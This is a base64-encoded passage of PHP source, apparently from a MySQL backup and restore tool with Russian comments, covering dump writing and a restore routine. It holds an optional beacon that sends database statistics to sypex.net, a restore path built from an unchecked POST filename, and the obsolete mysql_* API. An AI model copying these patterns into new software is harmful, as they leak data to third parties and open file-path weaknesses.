YWJsZV0sICR0aGlzLT5vbmx5X2NyZWF0ZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy8g0J7Qv9GA0LXQtNC10LTQtdC70Y/QtdC8INGC0LjQv9GLINGB0YLQvtC70LHRhtC+0LIKICAgICAgICAgICAgJE51bWVyaWNDb2x1bW4gPSBhcnJheSgpOwogICAgICAgICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNIT1cgQ09MVU1OUyBGUk9NIGB7JHRhYmxlfWAiKTsKICAgICAgICAgICAgJGZpZWxkID0gMDsKICAgICAgICAgICAgd2hpbGUoJGNvbCA9IG15c3FsX2ZldGNoX3JvdygkcmVzdWx0KSkgewogICAgICAgICAgICAgICAgJE51bWVyaWNDb2x1bW5bJGZpZWxkKytdID0gcHJlZ19tYXRjaCgiL14oXHcqaW50fHllYXIpLyIsICRjb2xbMV0pID8gMSA6IDA7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGZpZWxkcyA9ICRmaWVsZDsKICAgICAgICAgICAgJGZyb20gPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAkbGltaXQgPSAkdGFic2l6ZVskdGFibGVdOwogICAgICAgICAgICAgICAgICAgICAgICAkbGltaXQyID0gcm91bmQoJGxpbWl0IC8gMyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGFiaW5mb1skdGFibGVdID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRhYmluZm9bJHRhYmxlXSA+ICRsaW1pdDIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoMCwgJHQgLyAkdGFiaW5mb1swXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGkgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAiSU5TRVJUIElOVE8gYHskdGFibGV9YCBWQUxVRVMiKTsKICAgICAgICAgICAgd2hpbGUoKCRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0VMRUNUICogRlJPTSBgeyR0YWJsZX1gIExJTUlUIHskZnJvbX0sIHskbGltaXR9IikpICYmICgkdG90YWwgPSBteXNxbF9udW1fcm93cygkcmVzdWx0KSkpewogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSgkcm93ID0gbXlzcWxfZmV0Y2hfcm93KCRyZXN1bHQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpKys7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdCsrOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRrID0gMDsgJGsgPCAkZmllbGRzOyAkaysrKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE51bWVyaWNDb2x1bW5bJGtdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcm93WyRrXSA9IGlzc2V0KCRyb3dbJGtdKSA/ICRyb3dbJGtdIDogIk5VTEwiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyb3dbJGtdID0gaXNzZXQoJHJvd1ska10pID8gIiciIC4gbXlzcWxfZXNjYXBlX3N0cmluZygkcm93WyRrXSkgLiAiJyIgOiAiTlVMTCI7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAoJGkgPT0gMSA/ICIiIDogIiwiKSAuICJcbigiIC4gaW1wbG9kZSgiLCAiLCAkcm93KSAuICIpIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGkgJSAkbGltaXQyID09IDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoJGkgLyAkdGFiaW5mb1skdGFibGVdLCAkdCAvICR0YWJpbmZvWzBdKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXlzcWxfZnJlZV9yZXN1bHQoJHJlc3VsdCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRvdGFsIDwgJGxpbWl0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZyb20gKz0gJGxpbWl0OwogICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fd3JpdGUoJGZwLCAiO1xuXG4iKTsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoMSwgJHQgLyAkdGFiaW5mb1swXSk7fQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPnRhYnMgPSAkdGFiczsKICAgICAgICAgICAgICAgICR0aGlzLT5yZWNvcmRzID0gJHRhYmluZm9bMF07CiAgICAgICAgICAgICAgICAkdGhpcy0+Y29tcCA9ICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gKiAxMCArICR0aGlzLT5TRVRbJ2NvbXBfbGV2ZWwnXTsKICAgICAgICBlY2hvIHRwbF9zKDEsIDEpOwogICAgICAgIGVjaG8gdHBsX2woc3RyX3JlcGVhdCgiLSIsIDYwKSk7CiAgICAgICAgJHRoaXMtPmZuX2Nsb3NlKCRmcCk7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJCYWNrdXAgb2YgREI6IGB7JGRifWAgd2FzIGNyZWF0ZWQuIiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KDQsNC30LzQtdGAINCR0JQ6ICAgICAgICIgLiByb3VuZCgkdGhpcy0+c2l6ZSAvIDEwNDg1NzYsIDIpIC4gIiDQnNCRIiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgJGZpbGVzaXplID0gcm91bmQoZmlsZXNpemUoUEFUSCAuICR0aGlzLT5maWxlbmFtZSkgLyAxMDQ4NTc2LCAyKSAuICIg0JzQkSI7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJGaWxlIHNpemU6IHskZmlsZXNpemV9IiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KLQsNCx0LvQuNGGINC+0LHRgNCw0LHQvtGC0LDQvdC+OiB7JHRhYnN9IiwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KHRgtGA0L7QuiDQvtCx0YDQsNCx0L7RgtCw0L3QvjogICAiIC4gZm5faW50KCR0YWJpbmZvWzBdKSwgQ19SRVNVTFQpOwogICAgICAgICAgICAgICAgZWNobyAiPFNDUklQVD53aXRoIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2F2ZScpKSB7c3R5bGUuZGlzcGxheSA9ICcnOyBpbm5lckhUTUwgPSAn0KHQutCw0YfQsNGC0Ywg0YTQsNC50LsgKHskZmlsZXNpemV9KSc7IGhyZWYgPSAnIiAuIFVSTCAuICR0aGlzLT5maWxlbmFtZSAuICInOyB9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhY2snKS5kaXNhYmxlZCA9IDA7PC9TQ1JJUFQ+IjsKICAgICAgICAgICAgICAgIC8vINCf0LXRgNC10LTQsNGH0LAg0LTQsNC90L3Ri9GFINC00LvRjyDQs9C70L7QsdCw0LvRjNC90L7QuSDRgdGC0LDRgtC40YHRgtC40LrQuAogICAgICAgICAgICAgICAgaWYgKEdTKSBlY2hvICI8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdHUycpLnNyYyA9ICdodHRwOi8vc3lwZXgubmV0L2dzLnBocD9iPXskdGhpcy0+dGFic30seyR0aGlzLT5yZWNvcmRzfSx7JHRoaXMtPnNpemV9LHskdGhpcy0+Y29tcH0sMTA4Jzs8L1NDUklQVD4iOwoKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIHJlc3RvcmUoKXsKICAgICAgICAgICAgICAgIGlmICghaXNzZXQoJF9QT1NUKSkgeyR0aGlzLT5tYWluKCk7fQogICAgICAgICAgICAgICAgc2V0X2Vycm9yX2hhbmRsZXIoIlNYRF9lcnJvckhhbmRsZXIiKTsKICAgICAgICAgICAgICAgICRidXR0b25zID0gIjxJTlBVVCBJRD1iYWNrIFRZUEU9YnV0dG9uIFZBTFVFPSfQktC10YDQvdGD0YLRjNGB0Y8nIERJU0FCTEVEIG9uQ2xpY2s9XCJoaXN0b3J5LmJhY2soKTtcIj4iOwogICAgICAgICAgICAgICAgZWNobyB0cGxfcGFnZSh0cGxfcHJvY2Vzcygi0JLQvtGB0YHRgtCw0L3QvtCy0LvQtdC90LjQtSDQkdCUINC40Lcg0YDQtdC30LXRgNCy0L3QvtC5INC60L7Qv9C40LgiKSwgJGJ1dHRvbnMpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfYWN0aW9uJ10gICAgID0gMTsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfZGJfcmVzdG9yZSddID0gaXNzZXQoJF9QT1NUWydkYl9yZXN0b3JlJ10pID8gJF9QT1NUWydkYl9yZXN0b3JlJ10gOiAnJzsKICAgICAgICAgICAgICAgICRmaWxlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPSBpc3NldCgkX1BPU1RbJ2ZpbGUnXSkgPyAkX1BPU1RbJ2ZpbGUnXSA6ICcnOwogICAgICAgICAgICAgICAgJHRoaXMtPmZuX3NhdmUoKTsKICAgICAgICAgICAgICAgICRkYiA9ICR0aGlzLT5TRVRbJ2xhc3RfZGJfcmVzdG9yZSddOwoKICAgICAgICAgICAgICAgIGlmICghJGRiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woIkVycm9yISDQndC1INGD0LrQsNC30LDQvdCwINCx0LDQt9CwINC00LDQvdC90YvRhSEiLCBDX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfZW5hYmxlQmFjaygpOwogICAgICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJDb25uZWN0IHRvIERCIGB7JGRifWAuIik7CiAgICAgICAgICAgICAgICBteXNxbF9zZWxlY3RfZGIoJGRiKSBvciB0cmlnZ2VyX2Vycm9yICgi0J3QtSDRg9C00LDQtdGC0YHRjyDQstGL0LHRgNCw0YLRjCDQsdCw0LfRgyDQtNCw0L3QvdGL0YUuPEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwoKICAgICAgICAgICAgICAgIC8vINCe0L/RgNC10LTQtdC70LXQvdC40LUg0YTQvtGA0LzQsNGC0LAg0YTQsNC50LvQsAogICAgICAgICAgICAgICAgaWYocHJlZ19tYXRjaCgiL14oLis/KVwuc3FsKFwuKGJ6MnxneikpPyQvIiwgJGZpbGUsICRtYXRjaGVzKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNzZXQoJG1hdGNoZXNbM10pICYmICRtYXRjaGVzWzNdID09ICdiejInKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U0VUWydjb21wX21ldGhvZCddID0gMjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKGlzc2V0KCRtYXRjaGVzWzJdKSAmJiRtYXRjaGVzWzNdID09ICdneicpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPSAxOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnY29tcF9sZXZlbCddID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZmlsZV9leGlzdHMoUEFUSCAuICIveyRmaWxlfSIpKSB7CiAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0J7QqNCY0JHQmtCQISDQpNCw0LnQuyDQvdC1INC90LDQudC00LXQvSEiLCBDX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9lbmFibGVCYWNrKCk7CiAgICAgICAgICAgICAgICAgICAgZXhpdDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KfRgtC10L3QuNC1INGE0LDQudC70LAgYHskZmlsZX1gLiIpOwogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSA9ICRtYXRjaGVzWzFdOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0J7QqNCY0JHQmtCQISDQndC1INCy0YvQsdGA0LDQvSDRhNCw0LnQuyEiLCBDX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfZW5hYmxlQmFjaygpOwogICAgICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKHN0cl9yZXBlYXQoIi0iLCA2MCkpOwogICAgICAgICAgICAgICAgJGZwID0gJHRoaXMtPmZuX29wZW4oJGZpbGUsICJyIik7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZmlsZV9jYWNoZSA9ICRzcWwgPSAkdGFibGUgPSAkaW5zZXJ0ID0gJyc7CiAgICAgICAgJGlzX3NrZCA9ICRxdWVyeV9sZW4gPSAkZXhlY3V0ZSA9ICRxID0kdCA9ICRpID0gJGFmZl9yb3dzID0gMDsKICAgICAgICAgICAgICAgICRsaW1pdCA9IDMwMDsKICAgICAgICAkaW5kZXggPSA0OwogICAgICAgICAgICAgICAgJHRhYnMgPSAwOwogICAgICAgICAgICAgICAgJGNhY2hlID0gJyc7CiAgICAgICAgICAgICAgICAkaW5mbyA9IGFycmF5KCk7CgogICAgICAgICAgICAgICAgLy8g0KPRgdGC0LDQvdC+0LLQutCwINC60L7QtNC40YDQvtCy0LrQuCDRgdC+0LXQtNC40L3QtdC90LjRjwogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5teXNxbF92ZXJzaW9uID4gNDAxMDEgJiYgKENIQVJTRVQgIT0gJ2F1dG8nIHx8ICR0aGlzLT5mb3JjZWRfY2hhcnNldCkpIHsgLy8g0JrQvtC00LjRgNC+0LLQutCwINC/0L4g0YPQvNC+0LvRh9Cw0L3QuNGOLCDQtdGB0LvQuCDQsiDQtNCw0LzQv9C1INC90LUg0YPQutCw0LfQsNC90LAg0LrQvtC00LjRgNC+0LLQutCwCiAgICAgICAgICAgICAgICAgICAgICAgIG15c3FsX3F1ZXJ5KCJTRVQgTkFNRVMgJyIgLiAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0IC4gIiciKSBvciB0cmlnZ2VyX2Vycm9yICgi0J3QtdGD0LTQsNC10YLRgdGPINC40LfQvNC10L3QuNGC0Ywg0LrQvtC00LjRgNC+0LLQutGDINGB0L7QtdC00LjQvdC10L3QuNGPLjxCUj4iIC4gbXlzcWxfZXJyb3IoKSwgRV9VU0VSX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyB0cGxfbCgi0KPRgdGC0LDQvdC+0LLQu9C10L3QsCDQutC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8gYCIgLiAkdGhpcy0+cmVzdG9yZV9jaGFyc2V0IC4gImAuIiwgQ19XQVJOSU5HKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9ICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9ICcnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGxhc3Rfc2hvd2VkID0gJyc7CiAgICAgICAgICAgICAgICB3aGlsZSgoJHN0ciA9ICR0aGlzLT5mbl9yZWFkX3N0cigkZnApKSAhPT0gZmFsc2UpewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHN0cikgfHwgcHJlZ19tYXRjaCgiL14oI3wtLSkvIiwgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoISRpc19za2QgJiYgcHJlZ19tYXRjaCgiL14jU0tEMTAxXHwvIiwgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGluZm8gPSBleHBsb2RlKCJ8IiwgJHN0cik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9zKDAsICR0IC8gJGluZm9bNF0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGlzX3NrZCA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkcXVlcnlfbGVuICs9IHN0cmxlbigkc3RyKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJGluc2VydCAmJiBwcmVnX21hdGNoKCIvXihJTlNFUlQgSU5UTyBgPyhbXmAgXSspYD8gLio/VkFMVUVTKSguKikkL2kiLCAkc3RyLCAkbSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRhYmxlICE9ICRtWzJdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJsZSA9ICRtWzJdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYnMrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjYWNoZSAuPSB0cGxfbCgi0KLQsNCx0LvQuNGG0LAgYHskdGFibGV9YC4iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsYXN0X3Nob3dlZCA9ICR0YWJsZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaXNfc2tkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoMTAwICwgJHQgLyAkaW5mb1s0XSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRpbnNlcnQgPSAkbVsxXSAuICcgJzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3FsIC49ICRtWzNdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbmRleCsrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbmZvWyRpbmRleF0gPSBpc3NldCgkaW5mb1skaW5kZXhdKSA/ICRpbmZvWyRpbmRleF0gOiAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsaW1pdCA9IHJvdW5kKCRpbmZvWyRpbmRleF0gLyAyMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxpbWl0ID0gJGxpbWl0IDwgMzAwID8gMzAwIDogJGxpbWl0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaW5mb1skaW5kZXhdID4gJGxpbWl0KXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gJGNhY2hlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9zKDAgLyAkaW5mb1skaW5kZXhdLCAkdCAvICRpbmZvWzRdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgLj0gJHN0cjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGluc2VydCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaSsrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0Kys7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc19za2QgJiYgJGluZm9bJGluZGV4XSA+ICRsaW1pdCAmJiAkdCAlICRsaW1pdCA9PSAwKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gdHBsX3MoJGkgLyAkaW5mb1skaW5kZXhdLCAkdCAvICRpbmZvWzRdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkaW5zZXJ0ICYmIHByZWdfbWF0Y2goIi9eQ1JFQVRFIFRBQkxFIChJRiBOT1QgRVhJU1RTICk/YD8oW15gIF0rKWA/L2kiLCAkc3RyLCAkbSkgJiYgJHRhYmxlICE9ICRtWzJdKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFibGUgPSAkbVsyXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW5zZXJ0ID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYnMrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaXNfY3JlYXRlID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaSA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRzcWwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvOyQvIiwgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHNxbCA9IHJ0cmltKCRpbnNlcnQgLiAkc3FsLCAiOyIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVtcHR5KCRpbnNlcnQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+bXlzcWxfdmVyc2lvbiA8IDQwMTAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSBwcmVnX3JlcGxhY2UoIi9FTkdJTkVccz89LyIsICJUWVBFPSIsICRzcWwpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiAocHJlZ19tYXRjaCgiL0NSRUFURSBUQUJMRS9pIiwgJHNxbCkpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vINCS0YvRgdGC0LDQstC70Y/QtdC8INC60L7QtNC40YDQvtCy0LrRgyDRgdC+0LXQtNC40L3QtdC90LjRjwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvKENIQVJBQ1RFUiBTRVR8Q0hBUlNFVClbPVxzXSsoXHcrKS9pIiwgJHNxbCwgJGNoYXJzZXQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5mb3JjZWRfY2hhcnNldCAmJiAkY2hhcnNldFsyXSAhPSAkbGFzdF9jaGFyc2V0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChDSEFSU0VUID09ICdhdXRvJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG15c3FsX3F1ZXJ5KCJTRVQgTkFNRVMgJyIgLiAkY2hhcnNldFsyXSAuICInIikgb3IgdHJpZ2dlcl9lcnJvciAoItCd0LXRg9C00LDQtdGC0YHRjyDQuNC30LzQtdC90LjRgtGMINC60L7QtNC40YDQvtCy0LrRgyDRgdC+0LXQtNC40L3QtdC90LjRjy48QlI+eyRzcWx9PEJSPiIgLiBteXNxbF9lcnJvcigpLCBFX1VTRVJfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjYWNoZSAuPSB0cGxfbCgi0KPRgdGC0LDQvdC+0LLQu9C10L3QsCDQutC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8gYCIgLiAkY2hhcnNldFsyXSAuICJgLiIsIENfV0FSTklORyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9ICRjaGFyc2V0WzJdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlIC49IHRwbF9sKCfQmtC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8g0Lgg0YLQsNCx0LvQuNGG0Ysg0L3QtSDRgdC+0LLQv9Cw0LTQsNC10YI6JywgQ19FUlJPUik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNhY2hlIC49IHRwbF9sKCfQotCw0LHQu9C40YbQsCBgJy4gJHRhYmxlIC4nYCAtPiAnIC4gJGNoYXJzZXRbMl0gLiAnICjRgdC+0LXQtNC40L3QtdC90LjQtSAnICAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAnKScsIENfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyDQnNC10L3Rj9C10Lwg0LrQvtC00LjRgNC+0LLQutGDINC10YHQu9C4INGD0LrQsNC30LDQvdC+INGE0L7RgNGB0LjRgNC+0LLQsNGC0Ywg0LrQvtC00LjRgNC+0LLQutGDCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmZvcmNlZF9jaGFyc2V0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSBwcmVnX3JlcGxhY2UoIi8oXC9cKiFcZCtccyk/KChDT0xMQVRFKVs9XHNdKylcdysoXHMrXCpcLyk/L2kiLCAnJywgJHNxbCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSBwcmVnX3JlcGxhY2UoIi8oKENIQVJBQ1RFUiBTRVR8Q0hBUlNFVClbPVxzXSspXHcrL2kiLCAiXFwxIiAuICR0aGlzLT5yZXN0b3JlX2NoYXJzZXQgLiAkdGhpcy0+cmVzdG9yZV9jb2xsYXRlLCAkc3FsKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgI